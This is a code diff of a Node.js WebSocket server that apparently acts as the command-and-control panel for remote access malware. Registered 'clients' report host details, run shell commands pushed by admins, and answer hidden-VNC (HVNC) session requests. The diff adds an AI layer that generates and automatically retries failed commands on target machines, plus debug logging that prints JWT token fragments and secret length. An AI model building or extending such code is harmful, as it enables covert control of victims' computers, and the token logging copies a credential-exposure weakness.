@@ -1,9 +1,20 @@
+﻿const { debugLog } = require('../utils/debugLogger');
 const mongoose = require('mongoose');
 const Client = require('../models/Client');
 const Task = require('../models/Task');
 const { validateWebSocketMessage } = require('../middleware/validation');
 const jwt = require('jsonwebtoken');
 const telegramService = require('../services/telegramService');
+
+// Import AI Services
+const AICommandProcessor = require('../services/aiCommandProcessor');
+const SmartErrorHandler = require('../services/smartErrorHandler');
+const CommandOptimizer = require('../services/commandOptimizer');
+
+// Initialize AI Services
+const aiProcessor = new AICommandProcessor();
+const errorHandler = new SmartErrorHandler();
+const commandOptimizer = new CommandOptimizer();
 
 // Store all connected clients (unified approach)
 const connectedClients = new Map(); // Map of uuid -> websocket
@@ -37,6 +48,7 @@ const processPendingTasks = async (clientUuid, ws) => {
             try {
                 // Prepare command payload
                 let commandPayload = {
+                    type: 'command',              // ADD THIS - critical for routing
                     cmd: 'execute',
                     taskId: task.taskId,
                     command: task.command,
@@ -176,13 +188,28 @@ function extractCapabilities(data) {
 // Broadcast function to send data to all admin sessions
 function broadcastToAdminSessions(data) {
     const message = JSON.stringify(data);
+    console.log(`[BROADCAST] Broadcasting to ${adminSessions.size} admin sessions - Type: ${data.type}`);
+    
+    let sent = 0;
+    let failed = 0;
+    
     adminSessions.forEach(client => {
         if (client.readyState === client.OPEN) {
-            client.send(message);
+            try {
+                client.send(message);
+                sent++;
+            } catch (error) {
+                console.error(`[BROADCAST] Error sending to client:`, error);
+                failed++;
+            }
         } else {
+            console.log(`[BROADCAST] Skipping client - readyState: ${client.readyState}`);
+            failed++;
             adminSessions.delete(client);
         }
     });
+    
+    console.log(`[BROADCAST] Broadcast complete - Sent: ${sent}, Failed: ${failed}`);
 }
 
 // WebSocket connection handler with authentication and validation
@@ -213,7 +240,7 @@ const wsHandler = (ws, req) => {
     let clientType = 'unknown'; // 'client' or 'admin'
     let clientId = null;
     
-    console.log('New WebSocket connection from:', req.socket.remoteAddress);
+    debugLog.wsConnection('New WebSocket connection', { remoteAddress: req.socket.remoteAddress, userAgent: req.headers['user-agent'], timestamp: new Date().toISOString() });
     console.log('Current connections before new connection:', getConnectionStats());
     
     // Set connection timeout for authentication - INCREASED TO 60 SECONDS
@@ -226,11 +253,12 @@ const wsHandler = (ws, req) => {
     
     ws.on('message', async (message) => {
         try {
-            console.log('WebSocket message received from:', req.socket.remoteAddress, 'Message:', message.toString());
+            debugLog.wsMessage('WebSocket message received', { remoteAddress: req.socket.remoteAddress, messageSize: message.length, timestamp: new Date().toISOString() });
             let data;
             try {
                 data = JSON.parse(message);
                 console.log('Parsed WebSocket message:', data);
+                debugLog.wsMessage('WebSocket message parsed', { messageType: data.type, uuid: data.uuid, timestamp: new Date().toISOString() });
             } catch (parseError) {
                 console.error('Invalid JSON received:', parseError);
                 ws.send(JSON.stringify({ 
@@ -239,6 +267,9 @@ const wsHandler = (ws, req) => {
                 }));
                 return;
             }
+            
+            // Debug all incoming messages
+            console.log(`[MESSAGE DEBUG] Received message from ${ws.uuid || 'unknown'}:`, JSON.stringify(data));
             
             // Validate message structure and sanitize inputs
             const validationErrors = validateWebSocketMessage(data);
@@ -254,6 +285,8 @@ const wsHandler = (ws, req) => {
             
             // Handle authentication for admin sessions
             if (data.type === 'auth' && data.token) {
+                console.log('[ADMIN AUTH] Received auth message with token:', data.token.substring(0, 20) + '...');
+                console.log('[ADMIN AUTH] JWT_SECRET available:', !!process.env.JWT_SECRET);
                 try {
                     const decoded = jwt.verify(data.token, process.env.JWT_SECRET);
                     isAuthenticated = true;
@@ -262,15 +295,20 @@ const wsHandler = (ws, req) => {
                     clearTimeout(authTimeout);
                     
                     adminSessions.add(ws);
+                    console.log(`[ADMIN AUTH] Admin session authenticated: ${clientId}`);
+                    console.log(`[ADMIN AUTH] Total admin sessions: ${adminSessions.size}`);
+                    
                     ws.send(JSON.stringify({ 
                         type: 'auth_success', 
                         message: 'Authentication successful' 
                     }));
                     
-                    console.log('Admin session authenticated:', clientId);
+                    console.log('[ADMIN AUTH] Auth success message sent');
                     return;
                 } catch (jwtError) {
-                    console.error('JWT verification failed:', jwtError);
+                    console.error('[ADMIN AUTH] JWT verification failed:', jwtError);
+                    console.error('[ADMIN AUTH] Token:', data.token.substring(0, 50) + '...');
+                    console.error('[ADMIN AUTH] JWT_SECRET length:', process.env.JWT_SECRET ? process.env.JWT_SECRET.length : 'undefined');
                     ws.send(JSON.stringify({ 
                         type: 'auth_failed', 
                         message: 'Invalid token' 
@@ -282,7 +320,7 @@ const wsHandler = (ws, req) => {
             
             // For clients, first message should be registration
             if (!isAuthenticated && (data.type === 'register' || data.type === 'agent_register')) {
-                console.log('Processing client registration:', data);
+                debugLog.clientReg('Processing client registration', { uuid: data.uuid, computerName: data.computerName, platform: data.platform, ipAddress: data.ipAddress });
                 isAuthenticated = true;
                 clientType = 'client';
                 clientId = data.uuid || data.agentId;
@@ -367,15 +405,18 @@ const wsHandler = (ws, req) => {
                         );
                         
                     console.log('Direct database registration completed:', client.uuid);
+                    console.log('Client status in DB:', client.status);
+                    console.log('Admin sessions count:', adminSessions.size);
                     
                     // Broadcast the new client to admin sessions
                     const { webPanelIntegration } = require('./integration');
                     const formattedClient = webPanelIntegration.formatClientForWebPanel(client);
+                    console.log('Formatted client for broadcast:', JSON.stringify(formattedClient));
                     broadcastToAdminSessions({
                         type: 'client_status_update',
                         client: formattedClient
                     });
-                    console.log('Broadcasted new client to admin sessions');
+                    console.log('Broadcasted new client to admin sessions - message sent to', adminSessions.size, 'admins');
                 } catch (dbError) {
                     console.error('Database registration error:', dbError.message);
                 }
@@ -419,6 +460,167 @@ const wsHandler = (ws, req) => {
                 return;
             }
             
+            
+            // Handle client-specific messages (before authentication check)
+            if (data.type === 'output') {
+                // This is an output message from a client
+                const { taskId, output, status } = data;
+                
+                console.log(`[OUTPUT] Command output from client ${ws.uuid} for task ${taskId}`);
+                console.log(`[OUTPUT] Output length: ${output ? output.length : 0} bytes`);
+                console.log(`[OUTPUT] Status: ${status}`);
+                
+                // Get the original task to check if it was AI-processed
+                const originalTask = await Task.findOne({ taskId }).lean();
+                const isAIProcessed = originalTask && originalTask.params && originalTask.params.aiProcessing;
+                
+                // Handle AI error retry if command failed and was AI-processed
+                if (status === 'error' && isAIProcessed && originalTask.params.aiProcessing.retryCount < originalTask.params.aiProcessing.maxRetries) {
+                    console.log(`[AI ERROR HANDLER] Command failed, attempting AI retry for task ${taskId}`);
+                    
+                    try {
+                        const clientInfo = {
+                            uuid: ws.uuid,
+                            platform: ws.platform || 'unknown',
+                            systemInfo: ws.systemInfo || {}
+                        };
+                        
+                        // Create error object for AI processing
+                        const error = new Error(output);
+                        
+                        // Get AI retry command
+                        const retryCommand = await errorHandler.handleError(
+                            error,
+                            originalTask.params.aiProcessing.optimizedCommand,
+                            clientInfo,
+                            originalTask.params.aiProcessing.retryCount
+                        );
+                        
+                        if (retryCommand) {
+                            console.log(`[AI ERROR HANDLER] Generated retry command:`, retryCommand);
+                            
+                            // Update task with retry information
+                            await Task.findOneAndUpdate(
+                                { taskId: taskId },
+                                { 
+                                    $set: {
+                                        command: retryCommand.command,
+                                        'params.aiProcessing.retryCount': retryCommand.retryCount,
+                                        'params.aiProcessing.lastError': error.message,
+                                        'params.aiProcessing.lastFix': retryCommand.fixApplied,
+                                        'queue.state': 'pending',
+                                        'queue.attempts': (originalTask.queue.attempts || 0) + 1
+                                    }
+                                }
+                            );
+                            
+                            // Send retry command to client
+                            const retryMessage = {
+                                type: 'command',
+                                cmd: 'execute',
+                                command: retryCommand.command,
+                                taskId: taskId,
+                                timestamp: new Date().toISOString()
+                            };
+                            
+                            ws.send(JSON.stringify(retryMessage));
+                            console.log(`[AI ERROR HANDLER] Retry command sent to client ${ws.uuid}`);
+                            
+                            // Broadcast retry attempt to admin sessions
+                            broadcastToAdminSessions({
+                                type: 'command_retry',
+                                taskId: taskId,
+                                retryCount: retryCommand.retryCount,
+                                fixApplied: retryCommand.fixApplied,
+                                errorReason: retryCommand.errorReason,
+                                timestamp: new Date().toISOString()
+                            });
+                            
+                            return; // Don't process as final output yet
+                        }
+                    } catch (retryError) {
+                        console.error(`[AI ERROR HANDLER] Error in retry processing:`, retryError);
+                    }
+                }
+                
+                // Update task in database
+                if (taskId) {
+                    const updateData = {
+                        output: output,
+                        completedAt: new Date(),
+                        executionTimeMs: Date.now() - (new Date().getTime() - 60000) // Rough estimate
+                    };
+                    
+                    if (status === 'success') {
+                        updateData['queue.state'] = 'completed';
+                        
+                        // Learn from successful command if AI-processed
+                        if (isAIProcessed) {
+                            const clientInfo = {
+                                uuid: ws.uuid,
+                                platform: ws.platform || 'unknown',
+                                systemInfo: ws.systemInfo || {}
+                            };
+                            aiProcessor.learnFromResult(taskId, true, null, clientInfo);
+                        }
+                    } else {
+                        updateData['queue.state'] = 'failed';
+                        updateData.errorMessage = output;
+                        
+                        // Learn from failed command if AI-processed
+                        if (isAIProcessed) {
+                            const clientInfo = {
+                                uuid: ws.uuid,
+                                platform: ws.platform || 'unknown',
+                                systemInfo: ws.systemInfo || {}
+                            };
+                            aiProcessor.learnFromResult(taskId, false, output, clientInfo);
+                        }
+                    }
+                    
+                    await Task.findOneAndUpdate(
+                        { taskId: taskId },
+                        { $set: updateData }
+                    );
+                    
+                    console.log(`[OUTPUT] Task ${taskId} updated with status: ${status}`);
+
+                    // Broadcast task update to admin sessions
+                    const updatedTask = await Task.findOne({ taskId }).lean();
+                    broadcastToAdminSessions({
+                        type: 'task_updated',
+                        task: updatedTask,
+                        timestamp: new Date().toISOString()
+                    });
+                }
+                
+                // Get correlationId from map
+                const correlationId = taskToCorrelationMap.get(taskId);
+                console.log(`[OUTPUT] CorrelationId from map: ${correlationId}`);
+                console.log(`[OUTPUT] TaskToCorrelationMap size: ${taskToCorrelationMap.size}`);
+                console.log(`[OUTPUT] Admin sessions count: ${adminSessions.size}`);
+                
+                // Broadcast output to admin sessions with correlationId
+                const broadcastMessage = {
+                    type: 'output',
+                    uuid: ws.uuid,
+                    taskId: taskId,
+                    correlationId: correlationId,  // Include correlationId
+                    output: output,
+                    status: status || 'success',
+                    timestamp: new Date().toISOString()
+                };
+                
+                console.log(`[OUTPUT] Broadcasting to ${adminSessions.size} admin sessions:`, JSON.stringify(broadcastMessage));
+                broadcastToAdminSessions(broadcastMessage);
+                console.log(`[OUTPUT] Broadcast complete`);
+
+                // Clean up the map entry
+                if (taskToCorrelationMap.has(taskId)) {
+                    taskToCorrelationMap.delete(taskId);
+                }
+                return;
+            }
             
             // Reject messages from unauthenticated connections
             if (!isAuthenticated) {
@@ -514,64 +716,6 @@ const wsHandler = (ws, req) => {
                 return;
             }
 
-            if (data.type === 'output') {
-                // This is an output message from a client
-                const { taskId, output, status } = data;
-                
-                console.log(`Command output from client ${ws.uuid} for task ${taskId}: ${output}`);
-                
-                // Update task in database
-                if (taskId) {
-                    const updateData = {
-                        output: output,
-                        completedAt: new Date(),
-                        executionTimeMs: Date.now() - (new Date().getTime() - 60000) // Rough estimate
-                    };
-                    
-                    if (status === 'success') {
-                        updateData['queue.state'] = 'completed';
-                    } else {
-                        updateData['queue.state'] = 'failed';
-                        updateData.errorMessage = output;
-                    }
-                    
-                    await Task.findOneAndUpdate(
-                        { taskId: taskId },
-                        { $set: updateData }
-                    );
-                    
-                    console.log(`Task ${taskId} updated with status: ${status}`);
-
-                    // Broadcast task update to admin sessions
-                    const updatedTask = await Task.findOne({ taskId }).lean();
-                    broadcastToAdminSessions({
-                        type: 'task_updated',
-                        task: updatedTask,
-                        timestamp: new Date().toISOString()
-                    });
-                }
-                
-                // Get correlationId from map
-                const correlationId = taskToCorrelationMap.get(taskId);
-                
-                // Broadcast output to admin sessions with correlationId
-                broadcastToAdminSessions({
-                    type: 'output',
-                    uuid: ws.uuid,
-                    taskId: taskId,
-                    correlationId: correlationId,  // Include correlationId
-                    output: output,
-                    status: status || 'success',
-                    timestamp: new Date().toISOString()
-                });
-
-                // Clean up the map entry
-                if (taskToCorrelationMap.has(taskId)) {
-                    taskToCorrelationMap.delete(taskId);
-                }
-                return;
-            }
-
             if (data.type === 'hvnc_response') {
                 // Handle HVNC session responses from client
                 const { sessionId, status, error, frameData, screenInfo } = data;
@@ -627,13 +771,162 @@ const wsHandler = (ws, req) => {
                 return;
             }
 
+            // Debug command handling
+            if (data.type === 'command') {
+                console.log(`[COMMAND DEBUG] Received command message. clientType: ${clientType}, isAuthenticated: ${isAuthenticated}`);
+                console.log(`[COMMAND DEBUG] Command data:`, JSON.stringify(data));
+            }
+
+            // Handle AI-powered simple commands
+            if (data.type === 'simple_command' && clientType === 'admin') {
+                console.log(`[AI COMMAND] Processing simple command from admin`);
+                console.log(`[AI COMMAND] Command data:`, JSON.stringify(data));
+                
+                const { targetId, category, action, params, correlationId } = data;
+                
+                try {
+                    // Find target client
+                    let targetClient = null;
+                    let targetUuid = null;
+                    
+                    if (targetId && targetId.length === 36 && targetId.includes('-')) {
+                        targetClient = connectedClients.get(targetId);
+                        targetUuid = targetId;
+                    } else {
+                        for (const [uuid, client] of connectedClients.entries()) {
+                            if (client.ipAddress === targetId || client.ipAddress === targetId.replace(/[()]/g, '')) {
+                                targetClient = client;
+                                targetUuid = uuid;
+                                break;
+                            }
+                        }
+                    }
+                    
+                    if (!targetClient || targetClient.clientType !== 'client') {
+                        throw new Error('Client not found or not connected');
+                    }
+                    
+                    // Process command with AI
+                    const clientInfo = {
+                        uuid: targetUuid,
+                        platform: targetClient.platform || 'unknown',
+                        systemInfo: targetClient.systemInfo || {}
+                    };
+                    
+                    console.log(`[AI COMMAND] Processing command for client:`, clientInfo);
+                    
+                    // Generate optimized command using AI
+                    const aiResult = await aiProcessor.processCommand({
+                        category: category,
+                        action: action,
+                        ...params
+                    }, clientInfo);
+                    
+                    console.log(`[AI COMMAND] AI processing result:`, aiResult);
+                    
+                    // Optimize command further
+                    const optimizedCommand = await commandOptimizer.optimizeCommand(aiResult.optimizedCommand, clientInfo);
+                    
+                    console.log(`[AI COMMAND] Optimized command:`, optimizedCommand);
+                    
+                    // Generate task ID
+                    const taskId = `ai_cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+                    
+                    // Create task in database
+                    const task = new Task({
+                        taskId: taskId,
+                        agentUuid: targetUuid,
+                        command: optimizedCommand.command,
+                        params: {
+                            originalParams: params,
+                            aiProcessing: aiResult,
+                            optimization: optimizedCommand
+                        },
+                        createdBy: clientId || 'admin',
+                        platform: targetClient.platform || 'unknown',
+                        queue: {
+                            state: 'pending',
+                            attempts: 0,
+                            priority: 0
+                        }
+                    });
+                    await task.save();
+                    
+                    // Send optimized command to client
+                    const commandMessage = {
+                        type: 'command',
+                        cmd: 'execute',
+                        command: optimizedCommand.command,
+                        taskId: taskId,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    targetClient.send(JSON.stringify(commandMessage));
+                    console.log(`[AI COMMAND] Optimized command sent to client ${targetUuid} with taskId: ${taskId}`);
+                    
+                    // Send confirmation back to admin
+                    ws.send(JSON.stringify({
+                        type: 'command_sent',
+                        targetId: targetId,
+                        command: optimizedCommand.command,
+                        taskId: taskId,
+                        correlationId: correlationId,
+                        status: 'success',
+                        aiProcessed: true,
+                        timestamp: new Date().toISOString()
+                    }));
+                    
+                    // Store correlationId in map
+                    taskToCorrelationMap.set(taskId, correlationId);
+                    
+                    // Broadcast task creation
+                    broadcastToAdminSessions({
+                        type: 'task_created',
+                        task: task.toObject(),
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                } catch (error) {
+                    console.error(`[AI COMMAND] Error processing simple command:`, error);
+                    ws.send(JSON.stringify({
+                        type: 'command_sent',
+                        targetId: targetId,
+                        command: null,
+                        taskId: null,
+                        correlationId: correlationId,
+                        status: 'error',
+                        error: error.message,
+                        timestamp: new Date().toISOString()
+                    }));
+                }
+                return;
+            }
+
             if (data.type === 'command' && clientType === 'admin') {
                 // Handle command from admin to client
                 const { targetId, command, correlationId } = data;
                 console.log(`Admin sending command to client ${targetId}: ${command}`);
 
-                // Find the target client WebSocket
-                const targetClient = connectedClients.get(targetId);
+                // Find the target client WebSocket by UUID or IP address
+                let targetClient = null;
+                let targetUuid = null;
+                
+                // First try to find by UUID (if targetId is a UUID)
+                if (targetId && targetId.length === 36 && targetId.includes('-')) {
+                    targetClient = connectedClients.get(targetId);
+                    targetUuid = targetId;
+                } else {
+                    // Try to find by IP address
+                    for (const [uuid, client] of connectedClients.entries()) {
+                        if (client.ipAddress === targetId || client.ipAddress === targetId.replace(/[()]/g, '')) {
+                            targetClient = client;
+                            targetUuid = uuid;
+                            break;
+                        }
+                    }
+                }
+                
+                console.log(`[COMMAND] Target lookup - targetId: ${targetId}, found client: ${targetUuid}, clientType: ${targetClient?.clientType}`);
 
                 if (targetClient && targetClient.clientType === 'client') {
                     // Generate task ID
@@ -642,7 +935,7 @@ const wsHandler = (ws, req) => {
                     // Create task in database
                     const task = new Task({
                         taskId: taskId,
-                        agentUuid: targetId,
+                        agentUuid: targetUuid,  // Use the actual UUID, not targetId
                         command: command,
                         params: {},  // Add params if needed
                         createdBy: clientId || 'admin',  // Use admin clientId
@@ -658,9 +951,10 @@ const wsHandler = (ws, req) => {
 
                     // Send command to target client
                     const commandMessage = {
-                        cmd: 'execute',
-                        command: command,
-                        taskId: taskId,
+                        type: 'command',        // FIXED - for message routing
+                        cmd: 'execute',         // Correct - for command type
+                        command: command,       // All clients expect this
+                        taskId: taskId,         // All clients expect this
                         timestamp: new Date().toISOString()
                     };
 
@@ -687,6 +981,8 @@ const wsHandler = (ws, req) => {
 
                     // Store correlationId in map
                     taskToCorrelationMap.set(taskId, correlationId);
+                    console.log(`[COMMAND] Stored correlationId mapping: ${taskId} -> ${correlationId}`);
+                    console.log(`[COMMAND] TaskToCorrelationMap size: ${taskToCorrelationMap.size}`);
                 } else {
                     console.log(`Client ${targetId} not found or not connected`);
                     ws.send(JSON.stringify({
@@ -797,7 +1093,12 @@ const wsHandler = (ws, req) => {
                 const isCompatible = validateCommandCompatibility(task.command, operatingSystem, capabilities);
                 
                 if (isCompatible) {
-                    ws.send(JSON.stringify({ cmd: task.command, taskId: task._id }));
+                    ws.send(JSON.stringify({ 
+                        type: 'execute',        // C# client expects this
+                        cmd: 'execute',         // Qt client expects this  
+                        command: task.command,  // All clients expect this
+                        taskId: task._id        // All clients expect this
+                    }));
                     task.status = 'executed';
                     await task.save();
                     
